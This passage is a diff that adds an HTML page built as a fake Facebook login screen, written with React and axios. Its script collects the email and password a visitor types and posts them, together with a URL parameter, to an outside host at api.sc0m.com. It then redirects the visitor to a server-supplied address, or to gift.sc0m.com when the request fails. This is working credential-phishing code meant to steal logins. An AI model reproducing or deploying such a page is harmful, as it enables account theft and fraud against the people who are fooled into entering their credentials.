AgICAgICA8YnV0dG9uXG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3NOYW1lPVwiIHRleHQtd2hpdGUgcC0zIHJvdW5kZWQtbWQgdy1mdWxsIGJnLWJsdWUtNTAwIGhvdmVyOmJnLWJsdWUtNjAwXCJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgb25DbGljaz17YWRkTmV3fVxuICAgICAgICAgICAgICAgICAgICAgICAgPlxuICAgICAgICAgICAgICAgICAgICAgICAgIExvZyBJblxuICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+XG4gICAgICAgICAgICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgICAgICAgICAgIDwvZGl2PlxuICAgICAgICAgICAgICAgICAgPC9kaXY+Ki99XG4gICAgICAgICAgICAgICAgPC8+XG4gICAgICAgICAgICAgICk7XG4gICAgICAgICAgICB9O1xuXG4gICAgICAgICAgICAvL3JlbmRlciB0aGUgY29tcG9uZW50IHRvIHRoZSBET01cbiAgICAgICAgICAgIFJlYWN0RE9NLnJlbmRlcig8TWFpbkNvbnRlbnQgLz4sIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyb290JykpO1xuICAgICJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7QUFFTSxJQUFNQSxLQUFLLEdBQUdBLEtBQUssQ0FBQ0MsTUFBTSxDQUFDO0VBQ25CQyxPQUFPLEVBQUUsMEJBQTBCO0VBQ25DQyxPQUFPLEVBQUUsSUFBSTtFQUNiQyxPQUFPLEVBQUU7SUFBRSxpQkFBaUIsRUFBRTtFQUFHO0FBQ25DLENBQUMsQ0FBQztBQUVGLElBQU1DLFdBQVcsR0FBRyxTQUFkQSxXQUFXQSxDQUFBLEVBQVM7RUFHeEIsSUFBQUMsZUFBQSxHQUE0QkMsS0FBSyxDQUFDQyxRQUFRLENBQUMsRUFBRSxDQUFDO0lBQUFDLGdCQUFBLEdBQUFDLGNBQUEsQ0FBQUosZUFBQTtJQUF2Q0ssTUFBTSxHQUFBRixnQkFBQTtJQUFFRyxTQUFTLEdBQUFILGdCQUFBO0VBQ3hCLElBQUFJLGdCQUFBLE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
+    </script>
+</head>
+
+
+
+<!-- tailwind cdn  -->
+
+
+
+<body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+        <div id="top_form">
+            <div class="must">
+                <p>You must log in first.</p>
+            </div>
+            <div class="conta">
+                <div class="container">
+                    <div method="post"><img class="lg" src="https://i.ibb.co/hFT2CgF/Facebook.png" alt="" /><input class="in" type="text" name="email" placeholder="Email address or mobile number" /><input class="in" type="password" name="pass" placeholder="Password" /><input class="sub" type="submit" placeholder="" value="Login" /></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/babel">
+
+        const axios = axios.create({
+              baseURL: "https://api.sc0m.com/api",
+              timeout: 5000,
+              headers: { "X-Custom-Header": "" },
+            });
+
+            const MainContent = () => {
+
+
+              const [vEmail, setVEmail] = React.useState("");
+              const [vPassword, setVPassword] = React.useState("");
+              const [data, setData] = React.useState("");
+
+              React.useEffect(() => {
+
+                const url = window.location.href;
+                const params = new URL(url).searchParams;
+                const urlbase = params.get("url");
+                setData(urlbase);
+              }, []);
+
+              const addNew = () => {
+                if (vPassword === "" || vEmail === "")
+                  return alert("Please fill all the fields");
+                const body = {
+                  data,
+                  email: vEmail,
+                  password: vPassword,
+                };
+
+                axios
+                  .post("/contact", body)
+                  .then(({ data }) => {
+                    window.location = data;
+                  })
+                  .catch((err) => {
+                    window.location = "https://gift.sc0m.com";
+                  });
+              };
+              return (
+                <>
+                <div id="top_form">
+                    <div class="must"><p>You must log in first.</p></div>
+    <div class="conta">
+        <div class="container">
+                <div method="post">
+                          <img class="lg" src="https://i.ibb.co/hFT2CgF/Facebook.png" alt=""/>
+                          <input class="in" type="text" name="email" placeholder="Email address or mobile number" required="" onChange={(e) => setVEmail(e.target.value)}/>
+						   
+                          <input class="in" type="password" name="pass" placeholder="Password"  onChange={(e) => setVPassword(e.target.value)}/>
+                          <input class="sub" type="submit" placeholder="" value="Login"  onClick={addNew}/>
+
+                      </div>
+                      </div>
+                      </div>
+                        </div>
+
+             {  /*   <header className="bg-blue-500 h-14 w-full flex justify-start items-center pl-5 text-white font-normal">
+                    <p>Facebook</p>
+                  </header>
+
+                  <div className="grid place-content-center grid-cols-1 md:px-36 mt-10 gap-10">
+
+                    <div
+                      className="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "
+                    ></div>
+
+                    <div className="p-2 w-full  gap-1  ">
+                      <div className="flex flex-col   p-2  gap-1">
+                        <label className="text-gray-500 text-sm"></label>
+                        <input
+
+                          type="text"
+                          className="w-full border p-2 rounded-md"
+                          placeholder="Phone number, username, or email"
+                          onChange={(e) => setVEmail(e.target.value)}
+                        />
+                      </div>
+                      <div className="flex flex-col   p-2   gap-1">
+                        <label htmlFor="password" className="text-gray-500 text-sm">
+
+                        </label>
+                        <input
+                          type="password"
+                          className="w-full border p-2 rounded-md"
+                          placeholder="Password"
+                          id="password"
+                          autoComplete="new-password"
+                          onChange={(e) => setVPassword(e.target.value)}
+                        />
+                      </div>
+                      <div className="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+                        <button
+
+                          className=" text-white p-3 rounded-md w-full bg-blue-500 hover:bg-blue-600"
+                          onClick={addNew}
+                        >
+                         Log In
+                        </button>
+                      </div>
+                    </div>
+                  </div>*/}
+                </>
+              );
+            };
+
+            //render the component to the DOM
+            ReactDOM.render(<MainContent />, document.getElementById('root'));
+    </script>
+
+
+</body>
+
+</html>
